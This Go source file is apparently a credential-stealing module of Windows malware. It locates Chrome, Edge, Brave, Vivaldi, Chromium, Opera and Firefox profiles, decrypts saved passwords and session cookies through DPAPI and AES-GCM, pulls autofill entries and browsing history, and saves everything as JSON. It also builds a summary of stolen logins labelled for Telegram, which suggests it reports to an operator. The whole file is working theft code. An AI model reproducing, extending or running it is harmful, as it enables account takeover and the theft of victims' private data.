// ============================================================
// browsers.go - Complete Browser Extraction with Organized Output
// ============================================================
package browsers

import (
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/sys/windows"
)

// ============================================================
// DATA STRUCTURES FOR JSON OUTPUT
// ============================================================

// CookieEntry represents a browser cookie in the exact format requested
type CookieEntry struct {
	Host       string `json:"host"`
	Path       string `json:"path"`
	Keyname    string `json:"keyname"`
	Value      string `json:"value"`
	Secure     bool   `json:"secure"`
	Httponly   bool   `json:"httponly"`
	HasExpire  bool   `json:"has_expire"`
	Persistent bool   `json:"persistent"`
	CreateDate string `json:"create_date"`
	ExpireDate string `json:"expire_date"`
}

// PasswordEntry represents a browser password in the exact format requested
type PasswordEntry struct {
	URL        string `json:"url"`
	Username   string `json:"username"`
	Password   string `json:"password"`
	CreateDate string `json:"create_date"`
}

// BrowserData holds all extracted data for a browser
type BrowserData struct {
	Name      string         `json:"name"`
	Profiles  []ProfileData  `json:"profiles"`
	Timestamp string         `json:"timestamp"`
}

// ProfileData holds all data for a single profile
type ProfileData struct {
	Name      string          `json:"name"`
	Passwords []PasswordEntry `json:"passwords"`
	Cookies   []CookieEntry   `json:"cookies"`
	Autofill  []AutofillEntry `json:"autofill"`
	History   []HistoryEntry  `json:"history"`
}

// AutofillEntry holds autofill data
type AutofillEntry struct {
	Name  string `json:"name"`
	Value string `json:"value"`
}

// HistoryEntry holds history data
type HistoryEntry struct {
	URL   string `json:"url"`
	Title string `json:"title"`
	Count int    `json:"visit_count"`
	Time  string `json:"last_visit"`
}

var (
	allBrowserData []BrowserData
	extractedCount int
	outputDir      string
)

// Run starts browser extraction
func Run() {
	log.Println("🌐 Extracting browser data...")
	extractedCount = 0
	allBrowserData = []BrowserData{}
	
	// Create output directory
	outputDir = filepath.Join(".", "browser_data")
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		log.Printf("❌ Failed to create output directory: %v", err)
		return
	}
	
	browsers := getBrowsers()
	
	for _, browser := range browsers {
		log.Printf("📂 Processing: %s", browser)
		data := extractBrowser(browser)
		if data != nil && len(data.Profiles) > 0 {
			allBrowserData = append(allBrowserData, *data)
			extractedCount++
		}
	}
	
	if extractedCount > 0 {
		saveBrowserData()
		log.Printf("✅ Extracted data from %d browsers", extractedCount)
	} else {
		log.Println("⚠️ No browser data found")
	}
}

// getBrowsers returns list of browser names
func getBrowsers() []string {
	return []string{
		"Chrome",
		"Brave", 
		"Edge",
		"Opera",
		"Firefox",
		"Vivaldi",
		"Chromium",
	}
}

// extractBrowser extracts data from a specific browser
func extractBrowser(name string) *BrowserData {
	switch name {
	case "Chrome":
		return extractChromiumBrowser(name, "Google\\Chrome\\User Data")
	case "Brave":
		return extractChromiumBrowser(name, "BraveSoftware\\Brave-Browser\\User Data")
	case "Edge":
		return extractChromiumBrowser(name, "Microsoft\\Edge\\User Data")
	case "Vivaldi":
		return extractChromiumBrowser(name, "Vivaldi\\User Data")
	case "Chromium":
		return extractChromiumBrowser(name, "Chromium\\User Data")
	case "Opera":
		return extractOperaBrowser()
	case "Firefox":
		return extractFirefoxBrowser()
	default:
		return nil
	}
}

// ============================================================
// CHROMIUM BROWSER EXTRACTION
// ============================================================

// extractChromiumBrowser extracts data from Chromium-based browsers
func extractChromiumBrowser(name, relPath string) *BrowserData {
	data := &BrowserData{
		Name:      name,
		Timestamp: time.Now().Format("2006-01-02 15:04:05"),
	}
	
	localAppData := os.Getenv("LOCALAPPDATA")
	basePath := filepath.Join(localAppData, relPath)
	
	if _, err := os.Stat(basePath); os.IsNotExist(err) {
		log.Printf("⚠️ %s not found at: %s", name, basePath)
		return nil
	}
	
	// Get master key for decryption
	masterKey := getChromiumMasterKey(basePath)
	if len(masterKey) == 0 {
		log.Printf("⚠️ Failed to get master key for %s", name)
	}
	
	// Find profiles
	profiles := findProfiles(basePath)
	
	for _, profile := range profiles {
		profileData := ProfileData{Name: profile}
		
		// Extract passwords
		loginDB := filepath.Join(basePath, profile, "Login Data")
		if _, err := os.Stat(loginDB); err == nil {
			profileData.Passwords = extractChromiumPasswords(loginDB, masterKey)
		}
		
		// Extract cookies
		cookieDB := filepath.Join(basePath, profile, "Network", "Cookies")
		if _, err := os.Stat(cookieDB); err == nil {
			profileData.Cookies = extractChromiumCookies(cookieDB, masterKey)
		}
		
		// Extract autofill
		webDataDB := filepath.Join(basePath, profile, "Web Data")
		if _, err := os.Stat(webDataDB); err == nil {
			profileData.Autofill = extractChromiumAutofill(webDataDB)
		}
		
		// Extract history
		historyDB := filepath.Join(basePath, profile, "History")
		if _, err := os.Stat(historyDB); err == nil {
			profileData.History = extractChromiumHistory(historyDB)
		}
		
		data.Profiles = append(data.Profiles, profileData)
		
		// Save individual profile data
		saveProfileData(name, profile, profileData)
		
		log.Printf("✅ %s %s: %d passwords, %d cookies, %d autofill, %d history",
			name, profile, len(profileData.Passwords), len(profileData.Cookies), 
			len(profileData.Autofill), len(profileData.History))
	}
	
	return data
}

// ============================================================
// CHROMIUM MASTER KEY EXTRACTION
// ============================================================

// getChromiumMasterKey extracts the master key from Local State
func getChromiumMasterKey(basePath string) []byte {
	localStatePath := filepath.Join(basePath, "Local State")
	
	data, err := ioutil.ReadFile(localStatePath)
	if err != nil {
		return nil
	}
	
	var localState map[string]interface{}
	if err := json.Unmarshal(data, &localState); err != nil {
		return nil
	}
	
	osCrypt, ok := localState["os_crypt"].(map[string]interface{})
	if !ok {
		return nil
	}
	
	encryptedKey, ok := osCrypt["encrypted_key"].(string)
	if !ok {
		return nil
	}
	
	// Decode base64
	encKeyBytes, err := base64.StdEncoding.DecodeString(encryptedKey)
	if err != nil {
		return nil
	}
	
	// Remove "DPAPI" prefix (first 5 bytes)
	if len(encKeyBytes) < 5 {
		return nil
	}
	encKeyBytes = encKeyBytes[5:]
	
	// Decrypt with DPAPI
	return dpapiDecrypt(encKeyBytes)
}

// ============================================================
// DPAPI DECRYPTION (Windows)
// ============================================================

// dpapiDecrypt decrypts data using Windows DPAPI
func dpapiDecrypt(encrypted []byte) []byte {
	crypt32 := windows.NewLazyDLL("crypt32.dll")
	cryptUnprotectData := crypt32.NewProc("CryptUnprotectData")
	
	var blobIn, blobOut struct {
		cbData uint32
		pbData *byte
	}
	
	blobIn.cbData = uint32(len(encrypted))
	if len(encrypted) > 0 {
		blobIn.pbData = &encrypted[0]
	}
	
	var pDescription *uint16
	var pEntropy *byte
	var pReserved *byte
	var pPrompt *byte
	var dwFlags uint32 = 0
	
	ret, _, _ := cryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&blobIn)),
		uintptr(unsafe.Pointer(&pDescription)),
		uintptr(unsafe.Pointer(pEntropy)),
		uintptr(unsafe.Pointer(pReserved)),
		uintptr(unsafe.Pointer(pPrompt)),
		uintptr(dwFlags),
		uintptr(unsafe.Pointer(&blobOut)),
	)
	
	if ret == 0 {
		return nil
	}
	
	decrypted := make([]byte, blobOut.cbData)
	if blobOut.cbData > 0 {
		src := (*[1 << 30]byte)(unsafe.Pointer(blobOut.pbData))[:blobOut.cbData:blobOut.cbData]
		copy(decrypted, src)
	}
	
	return decrypted
}

// ============================================================
// CHROMIUM PASSWORD EXTRACTION
// ============================================================

// extractChromiumPasswords extracts passwords from Chromium
func extractChromiumPasswords(dbPath string, masterKey []byte) []PasswordEntry {
	var passwords []PasswordEntry
	
	tempDB := copyDatabase(dbPath)
	if tempDB == "" {
		return passwords
	}
	defer os.Remove(tempDB)
	
	db, err := sql.Open("sqlite3", tempDB)
	if err != nil {
		log.Printf("❌ Failed to open database: %v", err)
		return passwords
	}
	defer db.Close()
	
	query := `SELECT origin_url, username_value, password_value, date_created FROM logins`
	rows, err := db.Query(query)
	if err != nil {
		return passwords
	}
	defer rows.Close()
	
	for rows.Next() {
		var url, username string
		var encryptedPassword []byte
		var dateCreated int64
		
		if err := rows.Scan(&url, &username, &encryptedPassword, &dateCreated); err != nil {
			continue
		}
		
		password := decryptChromiumPassword(encryptedPassword, masterKey)
		
		if password != "" {
			entry := PasswordEntry{
				URL:      url,
				Username: username,
				Password: password,
			}
			
			if dateCreated > 0 {
				// Convert Chrome time (microseconds since 1601)
				seconds := dateCreated / 1000000
				entry.CreateDate = time.Unix(seconds-11644473600, 0).UTC().Format("2006-01-02T15:04:05Z")
			} else {
				entry.CreateDate = time.Now().UTC().Format("2006-01-02T15:04:05Z")
			}
			
			passwords = append(passwords, entry)
		}
	}
	
	return passwords
}

// decryptChromiumPassword decrypts a Chromium password
func decryptChromiumPassword(encrypted []byte, masterKey []byte) string {
	if len(encrypted) == 0 {
		return ""
	}
	
	// Check if it's v20 encrypted
	if len(encrypted) >= 3 && encrypted[0] == 'v' && encrypted[1] == '2' && encrypted[2] == '0' {
		if len(encrypted) < 3+12+16 {
			return ""
		}
		
		iv := encrypted[3:15]
		ciphertext := encrypted[15 : len(encrypted)-16]
		tag := encrypted[len(encrypted)-16:]
		
		decrypted := aesGcmDecrypt(ciphertext, masterKey, iv, tag)
		if decrypted != nil {
			if len(decrypted) > 32 {
				return string(decrypted[32:])
			}
		}
		return ""
	}
	
	// Try DPAPI decryption
	decrypted := dpapiDecrypt(encrypted)
	if decrypted != nil {
		return string(decrypted)
	}
	
	return ""
}

// ============================================================
// AES-GCM DECRYPTION
// ============================================================

// aesGcmDecrypt decrypts AES-GCM encrypted data using Windows BCrypt
func aesGcmDecrypt(ciphertext, key, nonce, tag []byte) []byte {
	if len(key) == 0 || len(ciphertext) == 0 {
		return nil
	}
	
	// Use Windows BCrypt for AES-GCM
	bcrypt := windows.NewLazyDLL("bcrypt.dll")
	
	openAlg := bcrypt.NewProc("BCryptOpenAlgorithmProvider")
	closeAlg := bcrypt.NewProc("BCryptCloseAlgorithmProvider")
	generateKey := bcrypt.NewProc("BCryptGenerateSymmetricKey")
	decrypt := bcrypt.NewProc("BCryptDecrypt")
	setProperty := bcrypt.NewProc("BCryptSetProperty")
	destroyKey := bcrypt.NewProc("BCryptDestroyKey")
	
	var hAlg uintptr
	algName, _ := windows.UTF16PtrFromString("AES")
	
	ret, _, _ := openAlg.Call(
		uintptr(unsafe.Pointer(&hAlg)),
		uintptr(unsafe.Pointer(algName)),
		0,
		0,
	)
	if ret != 0 {
		return nil
	}
	defer closeAlg.Call(hAlg, 0)
	
	gcmMode, _ := windows.UTF16PtrFromString("GCM")
	_, _, _ = setProperty.Call(
		hAlg,
		uintptr(unsafe.Pointer(gcmMode)),
		uintptr(unsafe.Pointer(gcmMode)),
		0,
		0,
	)
	
	var hKey uintptr
	var keyObject [256]byte
	
	ret, _, _ = generateKey.Call(
		hAlg,
		uintptr(unsafe.Pointer(&hKey)),
		uintptr(unsafe.Pointer(&keyObject[0])),
		uintptr(len(keyObject)),
		uintptr(unsafe.Pointer(&key[0])),
		uintptr(len(key)),
		0,
	)
	if ret != 0 {
		return nil
	}
	defer destroyKey.Call(hKey)
	
	type BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO struct {
		cbSize        uint32
		dwInfoVersion uint32
		pbNonce       *byte
		cbNonce       uint32
		pbAuthData    *byte
		cbAuthData    uint32
		pbTag         *byte
		cbTag         uint32
		pbMacContext  *byte
		cbMacContext  uint32
		cbAAD         uint32
		cbData        uint64
		dwFlags       uint32
	}
	
	authInfo := BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO{
		cbSize:        uint32(unsafe.Sizeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO{})),
		dwInfoVersion: 1,
	}
	
	if len(nonce) > 0 {
		authInfo.pbNonce = &nonce[0]
		authInfo.cbNonce = uint32(len(nonce))
	}
	
	if len(tag) > 0 {
		authInfo.pbTag = &tag[0]
		authInfo.cbTag = uint32(len(tag))
	}
	
	decrypted := make([]byte, len(ciphertext))
	var decryptedSize uint32
	
	ret, _, _ = decrypt.Call(
		hKey,
		uintptr(unsafe.Pointer(&ciphertext[0])),
		uintptr(len(ciphertext)),
		uintptr(unsafe.Pointer(&authInfo)),
		uintptr(unsafe.Pointer(&decrypted[0])),
		uintptr(len(decrypted)),
		uintptr(unsafe.Pointer(&decryptedSize)),
		0,
	)
	
	if ret != 0 {
		return nil
	}
	
	return decrypted[:decryptedSize]
}

// ============================================================
// CHROMIUM COOKIE EXTRACTION
// ============================================================

// extractChromiumCookies extracts cookies from Chromium
func extractChromiumCookies(dbPath string, masterKey []byte) []CookieEntry {
	var cookies []CookieEntry
	
	tempDB := copyDatabase(dbPath)
	if tempDB == "" {
		return cookies
	}
	defer os.Remove(tempDB)
	
	db, err := sql.Open("sqlite3", tempDB)
	if err != nil {
		return cookies
	}
	defer db.Close()
	
	query := `SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly, creation_utc FROM cookies`
	rows, err := db.Query(query)
	if err != nil {
		return cookies
	}
	defer rows.Close()
	
	for rows.Next() {
		var host, name, path string
		var encryptedValue []byte
		var expires, creation int64
		var secure, httponly int
        
		if err := rows.Scan(&host, &name, &encryptedValue, &path, &expires, &secure, &httponly, &creation); err != nil {
			continue
		}
		
		value := decryptChromiumValue(encryptedValue, masterKey)
		if value != "" {
			now := time.Now().Unix()
			hasExpire := expires > 0
			persistent := expires > now
			
			cookie := CookieEntry{
				Host:       host,
				Path:       path,
				Keyname:    name,
				Value:      value,
				Secure:     secure == 1,
				Httponly:   httponly == 1,
				HasExpire:  hasExpire,
				Persistent: persistent,
			}
			
			if creation > 0 {
				seconds := creation / 1000000
				cookie.CreateDate = time.Unix(seconds-11644473600, 0).UTC().Format("2006-01-02T15:04:05Z")
			} else {
				cookie.CreateDate = time.Now().UTC().Format("2006-01-02T15:04:05Z")
			}
			
			if hasExpire {
				seconds := expires / 1000000
				cookie.ExpireDate = time.Unix(seconds-11644473600, 0).UTC().Format("2006-01-02T15:04:05Z")
			} else {
				cookie.ExpireDate = "0001-01-01T00:00:00Z"
			}
			
			cookies = append(cookies, cookie)
		}
	}
	
	return cookies
}

// decryptChromiumValue decrypts a Chromium value
func decryptChromiumValue(encrypted []byte, masterKey []byte) string {
	if len(encrypted) == 0 {
		return ""
	}
	
	if len(encrypted) >= 3 && encrypted[0] == 'v' && encrypted[1] == '2' && encrypted[2] == '0' {
		if len(encrypted) < 3+12+16 {
			return ""
		}
		
		iv := encrypted[3:15]
		ciphertext := encrypted[15 : len(encrypted)-16]
		tag := encrypted[len(encrypted)-16:]
		
		decrypted := aesGcmDecrypt(ciphertext, masterKey, iv, tag)
		if decrypted != nil {
			if len(decrypted) > 32 {
				return string(decrypted[32:])
			}
			return string(decrypted)
		}
		return ""
	}
	
	decrypted := dpapiDecrypt(encrypted)
	if decrypted != nil {
		return string(decrypted)
	}
	
	return ""
}

// ============================================================
// CHROMIUM AUTOFILL EXTRACTION
// ============================================================

// extractChromiumAutofill extracts autofill data
func extractChromiumAutofill(dbPath string) []AutofillEntry {
	var autofill []AutofillEntry
	
	tempDB := copyDatabase(dbPath)
	if tempDB == "" {
		return autofill
	}
	defer os.Remove(tempDB)
	
	db, err := sql.Open("sqlite3", tempDB)
	if err != nil {
		return autofill
	}
	defer db.Close()
	
	query := `SELECT name, value FROM autofill`
	rows, err := db.Query(query)
	if err != nil {
		return autofill
	}
	defer rows.Close()
	
	for rows.Next() {
		var name, value string
		if err := rows.Scan(&name, &value); err == nil {
			autofill = append(autofill, AutofillEntry{
				Name:  name,
				Value: value,
			})
		}
	}
	
	return autofill
}

// ============================================================
// CHROMIUM HISTORY EXTRACTION
// ============================================================

// extractChromiumHistory extracts browsing history
func extractChromiumHistory(dbPath string) []HistoryEntry {
	var history []HistoryEntry
	
	tempDB := copyDatabase(dbPath)
	if tempDB == "" {
		return history
	}
	defer os.Remove(tempDB)
	
	db, err := sql.Open("sqlite3", tempDB)
	if err != nil {
		return history
	}
	defer db.Close()
	
	query := `SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100`
	rows, err := db.Query(query)
	if err != nil {
		return history
	}
	defer rows.Close()
	
	for rows.Next() {
		var url, title string
		var count int
		var lastVisit int64
		if err := rows.Scan(&url, &title, &count, &lastVisit); err == nil {
			entry := HistoryEntry{
				URL:   url,
				Title: title,
				Count: count,
			}
			
			if lastVisit > 0 {
				seconds := lastVisit / 1000000
				entry.Time = time.Unix(seconds-11644473600, 0).UTC().Format("2006-01-02T15:04:05Z")
			} else {
				entry.Time = time.Now().UTC().Format("2006-01-02T15:04:05Z")
			}
			
			history = append(history, entry)
		}
	}
	
	return history
}

// ============================================================
// FIREFOX EXTRACTION
// ============================================================

// extractFirefoxBrowser extracts data from Firefox
func extractFirefoxBrowser() *BrowserData {
	data := &BrowserData{
		Name:      "Firefox",
		Timestamp: time.Now().Format("2006-01-02 15:04:05"),
	}
	
	roamingAppData := os.Getenv("APPDATA")
	firefoxPath := filepath.Join(roamingAppData, "Mozilla", "Firefox", "Profiles")
	
	if _, err := os.Stat(firefoxPath); os.IsNotExist(err) {
		log.Println("⚠️ Firefox not found")
		return nil
	}
	
	entries, err := ioutil.ReadDir(firefoxPath)
	if err != nil {
		return nil
	}
	
	for _, entry := range entries {
		if entry.IsDir() && (strings.HasSuffix(entry.Name(), ".default") || strings.Contains(entry.Name(), "default")) {
			profileData := ProfileData{Name: entry.Name()}
			profilePath := filepath.Join(firefoxPath, entry.Name())
			
			// Extract passwords from logins.json
			loginsJSON := filepath.Join(profilePath, "logins.json")
			if _, err := os.Stat(loginsJSON); err == nil {
				profileData.Passwords = extractFirefoxPasswords(loginsJSON)
			}
			
			// Extract cookies from cookies.sqlite
			cookiesDB := filepath.Join(profilePath, "cookies.sqlite")
			if _, err := os.Stat(cookiesDB); err == nil {
				profileData.Cookies = extractFirefoxCookies(cookiesDB)
			}
			
			// Extract history from places.sqlite
			placesDB := filepath.Join(profilePath, "places.sqlite")
			if _, err := os.Stat(placesDB); err == nil {
				profileData.History = extractFirefoxHistory(placesDB)
			}
			
			data.Profiles = append(data.Profiles, profileData)
			
			// Save individual profile data
			saveProfileData("Firefox", entry.Name(), profileData)
			
			log.Printf("✅ Firefox %s: %d passwords, %d cookies, %d history",
				entry.Name(), len(profileData.Passwords), len(profileData.Cookies), len(profileData.History))
		}
	}
	
	return data
}

// extractFirefoxPasswords extracts passwords from Firefox
func extractFirefoxPasswords(jsonPath string) []PasswordEntry {
	var passwords []PasswordEntry
	
	data, err := ioutil.ReadFile(jsonPath)
	if err != nil {
		return passwords
	}
	
	var loginsData map[string]interface{}
	if err := json.Unmarshal(data, &loginsData); err != nil {
		return passwords
	}
	
	logins, ok := loginsData["logins"].([]interface{})
	if !ok {
		return passwords
	}
	
	for _, login := range logins {
		entry, ok := login.(map[string]interface{})
		if !ok {
			continue
		}
		
		url, _ := entry["hostname"].(string)
		username, _ := entry["username"].(string)
		password, _ := entry["password"].(string)
		
		if url != "" {
			passwords = append(passwords, PasswordEntry{
				URL:        url,
				Username:   username,
				Password:   password,
				CreateDate: time.Now().UTC().Format("2006-01-02T15:04:05Z"),
			})
		}
	}
	
	return passwords
}

// extractFirefoxCookies extracts cookies from Firefox
func extractFirefoxCookies(dbPath string) []CookieEntry {
	var cookies []CookieEntry
	
	tempDB := copyDatabase(dbPath)
	if tempDB == "" {
		return cookies
	}
	defer os.Remove(tempDB)
	
	db, err := sql.Open("sqlite3", tempDB)
	if err != nil {
		return cookies
	}
	defer db.Close()
	
	query := `SELECT host, name, value, path, expiry, isSecure, creationTime FROM moz_cookies`
	rows, err := db.Query(query)
	if err != nil {
		return cookies
	}
	defer rows.Close()
	
	for rows.Next() {
		var host, name, value, path string
		var expiry, creation int64
		var secure int
        
		if err := rows.Scan(&host, &name, &value, &path, &expiry, &secure, &creation); err == nil {
			now := time.Now().Unix()
			hasExpire := expiry > 0
			persistent := expiry > now
			
			cookie := CookieEntry{
				Host:       host,
				Path:       path,
				Keyname:    name,
				Value:      value,
				Secure:     secure == 1,
				Httponly:   false, // Firefox doesn't store this in cookies table
				HasExpire:  hasExpire,
				Persistent: persistent,
				CreateDate: time.Unix(creation/1000000, 0).UTC().Format("2006-01-02T15:04:05Z"),
			}
			
			if hasExpire {
				cookie.ExpireDate = time.Unix(expiry, 0).UTC().Format("2006-01-02T15:04:05Z")
			} else {
				cookie.ExpireDate = "0001-01-01T00:00:00Z"
			}
			
			cookies = append(cookies, cookie)
		}
	}
	
	return cookies
}

// extractFirefoxHistory extracts history from Firefox
func extractFirefoxHistory(dbPath string) []HistoryEntry {
	var history []HistoryEntry
	
	tempDB := copyDatabase(dbPath)
	if tempDB == "" {
		return history
	}
	defer os.Remove(tempDB)
	
	db, err := sql.Open("sqlite3", tempDB)
	if err != nil {
		return history
	}
	defer db.Close()
	
	query := `SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 100`
	rows, err := db.Query(query)
	if err != nil {
		return history
	}
	defer rows.Close()
	
	for rows.Next() {
		var url, title string
		var count int
		if err := rows.Scan(&url, &title, &count); err == nil {
			history = append(history, HistoryEntry{
				URL:   url,
				Title: title,
				Count: count,
				Time:  time.Now().UTC().Format("2006-01-02T15:04:05Z"),
			})
		}
	}
	
	return history
}

// ============================================================
// OPERA EXTRACTION
// ============================================================

// extractOperaBrowser extracts data from Opera
func extractOperaBrowser() *BrowserData {
	data := &BrowserData{
		Name:      "Opera",
		Timestamp: time.Now().Format("2006-01-02 15:04:05"),
	}
	
	roamingAppData := os.Getenv("APPDATA")
	operaPath := filepath.Join(roamingAppData, "Opera Software", "Opera Stable")
	
	if _, err := os.Stat(operaPath); os.IsNotExist(err) {
		log.Println("⚠️ Opera not found")
		return nil
	}
	
	profileData := ProfileData{Name: "Default"}
	
	// Get master key for Opera (uses same method as Chromium)
	masterKey := getChromiumMasterKey(operaPath)
	
	// Extract passwords
	loginDB := filepath.Join(operaPath, "Login Data")
	if _, err := os.Stat(loginDB); err == nil {
		profileData.Passwords = extractChromiumPasswords(loginDB, masterKey)
	}
	
	// Extract cookies
	cookieDB := filepath.Join(operaPath, "Network", "Cookies")
	if _, err := os.Stat(cookieDB); err == nil {
		profileData.Cookies = extractChromiumCookies(cookieDB, masterKey)
	}
	
	data.Profiles = append(data.Profiles, profileData)
	
	saveProfileData("Opera", "Default", profileData)
	
	log.Printf("✅ Opera: %d passwords, %d cookies", 
		len(profileData.Passwords), len(profileData.Cookies))
	
	return data
}

// ============================================================
// UTILITY FUNCTIONS
// ============================================================

// findProfiles finds browser profiles
func findProfiles(basePath string) []string {
	var profiles []string
	
	if _, err := os.Stat(filepath.Join(basePath, "Default")); err == nil {
		profiles = append(profiles, "Default")
	}
	
	for i := 1; i <= 20; i++ {
		profileName := fmt.Sprintf("Profile %d", i)
		if _, err := os.Stat(filepath.Join(basePath, profileName)); err == nil {
			profiles = append(profiles, profileName)
		}
	}
	
	return profiles
}

// copyDatabase copies a database file to temp
func copyDatabase(dbPath string) string {
	if _, err := os.Stat(dbPath); os.IsNotExist(err) {
		return ""
	}
	
	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf("browser_db_%d.db", time.Now().UnixNano()))
	
	data, err := ioutil.ReadFile(dbPath)
	if err != nil {
		return ""
	}
	
	if err := ioutil.WriteFile(tmpFile, data, 0644); err != nil {
		return ""
	}
	
	return tmpFile
}

// saveProfileData saves individual profile data to organized directories
func saveProfileData(browserName, profileName string, data ProfileData) {
	// Create browser directory
	browserDir := filepath.Join(outputDir, browserName)
	if err := os.MkdirAll(browserDir, 0755); err != nil {
		log.Printf("❌ Failed to create browser directory: %v", err)
		return
	}
	
	// Create profile directory
	profileDir := filepath.Join(browserDir, profileName)
	if err := os.MkdirAll(profileDir, 0755); err != nil {
		log.Printf("❌ Failed to create profile directory: %v", err)
		return
	}
	
	// Save passwords
	if len(data.Passwords) > 0 {
		passwordsJSON, err := json.MarshalIndent(data.Passwords, "", "  ")
		if err == nil {
			ioutil.WriteFile(filepath.Join(profileDir, "passwords.json"), passwordsJSON, 0644)
		}
	}
	
	// Save cookies
	if len(data.Cookies) > 0 {
		cookiesJSON, err := json.MarshalIndent(data.Cookies, "", "  ")
		if err == nil {
			ioutil.WriteFile(filepath.Join(profileDir, "cookies.json"), cookiesJSON, 0644)
		}
	}
	
	// Save autofill
	if len(data.Autofill) > 0 {
		autofillJSON, err := json.MarshalIndent(data.Autofill, "", "  ")
		if err == nil {
			ioutil.WriteFile(filepath.Join(profileDir, "autofill.json"), autofillJSON, 0644)
		}
	}
	
	// Save history
	if len(data.History) > 0 {
		historyJSON, err := json.MarshalIndent(data.History, "", "  ")
		if err == nil {
			ioutil.WriteFile(filepath.Join(profileDir, "history.json"), historyJSON, 0644)
		}
	}
	
	// Create summary file
	summary := map[string]interface{}{
		"browser":   browserName,
		"profile":   profileName,
		"timestamp": time.Now().UTC().Format("2006-01-02T15:04:05Z"),
		"stats": map[string]int{
			"passwords": len(data.Passwords),
			"cookies":   len(data.Cookies),
			"autofill":  len(data.Autofill),
			"history":   len(data.History),
		},
	}
	
	summaryJSON, _ := json.MarshalIndent(summary, "", "  ")
	ioutil.WriteFile(filepath.Join(profileDir, "summary.json"), summaryJSON, 0644)
}

// saveBrowserData saves combined browser data
func saveBrowserData() {
	if len(allBrowserData) == 0 {
		return
	}
	
	// Save combined data
	combinedPath := filepath.Join(outputDir, "all_browser_data.json")
	jsonData, err := json.MarshalIndent(allBrowserData, "", "  ")
	if err != nil {
		log.Printf("❌ Failed to marshal combined data: %v", err)
		return
	}
	
	if err := ioutil.WriteFile(combinedPath, jsonData, 0644); err != nil {
		log.Printf("❌ Failed to save combined data: %v", err)
		return
	}
	
	log.Printf("✅ Combined browser data saved to: %s", combinedPath)
	log.Printf("📁 Individual profiles saved to: %s", outputDir)
}

// GetBrowserData returns the extracted browser data
func GetBrowserData() []BrowserData {
	return allBrowserData
}

// GetOutputDir returns the output directory path
func GetOutputDir() string {
	return outputDir
}

// FormatBrowserData formats browser data for Telegram
func FormatBrowserData() string {
	if len(allBrowserData) == 0 {
		return "⚠️ No browser data found"
	}
	
	var output strings.Builder
	output.WriteString("🌐 BROWSER DATA\n")
	output.WriteString(strings.Repeat("=", 40) + "\n\n")
	
	totalPasswords := 0
	totalCookies := 0
	
	for _, browser := range allBrowserData {
		output.WriteString(fmt.Sprintf("📁 %s\n", browser.Name))
		
		for _, profile := range browser.Profiles {
			passCount := len(profile.Passwords)
			cookieCount := len(profile.Cookies)
			
			totalPasswords += passCount
			totalCookies += cookieCount
			
			if passCount > 0 || cookieCount > 0 {
				output.WriteString(fmt.Sprintf("  📂 %s\n", profile.Name))
				output.WriteString(fmt.Sprintf("    🔑 Passwords: %d\n", passCount))
				output.WriteString(fmt.Sprintf("    🍪 Cookies: %d\n", cookieCount))
				
				if passCount > 0 {
					output.WriteString("    📋 Sample passwords:\n")
					maxShow := 5
					if passCount < maxShow {
						maxShow = passCount
					}
					for i := 0; i < maxShow; i++ {
						p := profile.Passwords[i]
						output.WriteString(fmt.Sprintf("      • %s | %s\n", p.URL, p.Username))
					}
					if passCount > 5 {
						output.WriteString(fmt.Sprintf("      ... and %d more\n", passCount-5))
					}
				}
			}
		}
		output.WriteString("\n")
	}
	
	output.WriteString(strings.Repeat("=", 40) + "\n")
	output.WriteString(fmt.Sprintf("📊 Total: %d passwords, %d cookies\n", totalPasswords, totalCookies))
	output.WriteString(fmt.Sprintf("📁 Data saved to: %s", outputDir))
	
	return output.String()
}